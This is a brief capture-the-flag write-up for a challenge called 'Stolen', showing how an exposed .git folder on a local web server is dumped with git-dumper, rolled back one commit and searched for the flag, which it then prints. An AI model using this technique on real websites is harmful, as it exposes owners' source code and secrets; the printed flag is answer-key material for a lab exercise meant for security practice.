# Stolen

## Write-up

The `.git` folder is exposed, you can download it using a tool like `git-dumper` and then revert the latest change to retreive the flag.
```bash
git-dumper http://127.0.0.1:8000/.git stolen
cd stolen
git checkout HEAD~1
cat index.php | grep flag-
```

## Flag

`flag-9555dc70b0bd8a98b18d32caa802173cc71931c260be4b976344ca0adddc56e1`